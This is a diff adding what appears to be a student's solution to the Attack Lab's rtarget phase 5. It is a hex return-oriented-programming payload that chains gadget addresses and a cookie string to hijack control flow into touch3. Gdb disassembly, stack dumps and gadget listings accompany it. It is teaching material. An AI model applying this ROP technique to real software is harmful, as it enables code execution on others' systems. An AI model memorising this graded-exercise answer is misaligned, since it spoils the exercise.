@@ -1,0 +1,140 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+48 e3 ff ff ff 7f 00 00
+06 1a 40 00 00 00 00 00
+c5 19 40 00 00 00 00 00
+ab 19 40 00 00 00 00 00
+48 00 00 00 00 00 00 00
+dd 19 40 00 00 00 00 00
+34 1a 40 00 00 00 00 00
+13 1a 40 00 00 00 00 00
+d6 19 40 00 00 00 00 00
+c5 19 40 00 00 00 00 00
+fa 18 40 00 00 00 00 00
+35 39 62 39 39 37 66 61
+00 f4 f4 f4 f4 f4 f4 f4
+
+/*
+
+(gdb) disas touch3
+Dump of assembler code for function touch3:
+   0x00000000004018fa <+0>:     push   %rbx
+   0x00000000004018fb <+1>:     mov    %rdi,%rbx
+   0x00000000004018fe <+4>:     movl   $0x3,0x203bd4(%rip)        # 0x6054dc <vlevel>
+   0x0000000000401908 <+14>:    mov    %rdi,%rsi
+   0x000000000040190b <+17>:    mov    0x203bd3(%rip),%edi        # 0x6054e4 <cookie>
+   0x0000000000401911 <+23>:    callq  0x40184c <hexmatch>
+   0x0000000000401916 <+28>:    test   %eax,%eax
+   0x0000000000401918 <+30>:    je     0x40193d <touch3+67>
+   0x000000000040191a <+32>:    mov    %rbx,%rdx
+   0x000000000040191d <+35>:    mov    $0x403258,%esi
+   0x0000000000401922 <+40>:    mov    $0x1,%edi
+   0x0000000000401927 <+45>:    mov    $0x0,%eax
+   0x000000000040192c <+50>:    callq  0x400df0 <__printf_chk@plt>
+   0x0000000000401931 <+55>:    mov    $0x3,%edi
+   0x0000000000401936 <+60>:    callq  0x401dad <validate>
+   0x000000000040193b <+65>:    jmp    0x40195e <touch3+100>
+   0x000000000040193d <+67>:    mov    %rbx,%rdx
+   0x0000000000401940 <+70>:    mov    $0x403280,%esi
+   0x0000000000401945 <+75>:    mov    $0x1,%edi
+   0x000000000040194a <+80>:    mov    $0x0,%eax
+   0x000000000040194f <+85>:    callq  0x400df0 <__printf_chk@plt>
+   0x0000000000401954 <+90>:    mov    $0x3,%edi
+   0x0000000000401959 <+95>:    callq  0x401e6f <fail>
+   0x000000000040195e <+100>:   mov    $0x0,%edi
+   0x0000000000401963 <+105>:   callq  0x400e40 <exit@plt>
+End of assembler dump.
+
+(gdb) x/160bx $rsp
+0x7ffffff871d0: 0x61    0x62    0x63    0x64    0x65    0x31    0x32    0x33
+0x7ffffff871d8: 0x34    0x35    0x00    0x00    0x00    0x00    0x00    0x00
+0x7ffffff871e0: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x7ffffff871e8: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x7ffffff871f0: 0x58    0xe3    0xff    0xff    0xff    0x7f    0x00    0x00
+0x7ffffff871f8: 0x76    0x19    0x40    0x00    0x00    0x00    0x00    0x00
+0x7ffffff87200: 0x09    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x7ffffff87208: 0x44    0x20    0x40    0x00    0x00    0x00    0x00    0x00
+0x7ffffff87210: 0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
+0x7ffffff87218: 0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
+0x7ffffff87220: 0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
+0x7ffffff87228: 0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
+0x7ffffff87230: 0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
+0x7ffffff87238: 0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
+0x7ffffff87240: 0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
+0x7ffffff87248: 0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
+0x7ffffff87250: 0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
+0x7ffffff87258: 0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
+0x7ffffff87260: 0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
+0x7ffffff87268: 0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4    0xf4
+
+0000000000000000 <.text>:
+   0:   48 89 c7                mov    %rax,%rdi
+   3:   48 89 e0                mov    %rsp,%rax
+   6:   58                      pop    %rax
+   7:   89 c2                   mov    %eax,%edx
+   9:   89 ce                   mov    %ecx,%esi
+   b:   89 d1                   mov    %edx,%ecx
+   d:   c3                      retq
+   e:   90                      nop
+   f:   38 c9                   cmp    %cl,%cl
+
+objdump -d rtarget > rtarget.d
+
+48 89 e0                mov    %rsp,%rax
+c3                      retq
+0000000000401a03 <addval_190>:
+  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
+  401a09:	c3                   	retq   
+
+48 89 c7                mov    %rax,%rdi
+90                      nop
+c3                      retq
+00000000004019c3 <setval_426>:
+  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
+  4019c9:	c3                   	retq   
+
+58                      pop    %rax
+90                      nop
+c3                      retq
+00000000004019a7 <addval_219>:
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+  4019ad:	c3                   	retq   
+
+89 c2                   mov    %eax,%edx
+90                      nop
+c3                      retq
+00000000004019db <getval_481>:
+  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax
+  4019e0:	c3                   	retq   
+
+89 d1                   mov    %edx,%ecx
+38 c9                   cmp    %cl,%cl
+c3                      retq
+0000000000401a33 <getval_159>:
+  401a33:	b8 89 d1 38 c9       	mov    $0xc938d189,%eax
+  401a38:	c3                   	retq   
+
+89 ce                   mov    %ecx,%esi
+90                      nop
+90                      nop
+c3                      retq
+0000000000401a11 <addval_436>:
+  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax
+  401a17:	c3                   	retq   
+
+00000000004019d6 <add_xy>:
+  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
+  4019da:	c3                   	retq   
+
+48 89 c7                mov    %rax,%rdi
+90                      nop
+c3                      retq
+00000000004019c3 <setval_426>:
+  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
+  4019c9:	c3                   	retq   
+
+./hex2raw < rtarget-5.txt > rtarget-5-raw.txt
+
+*/
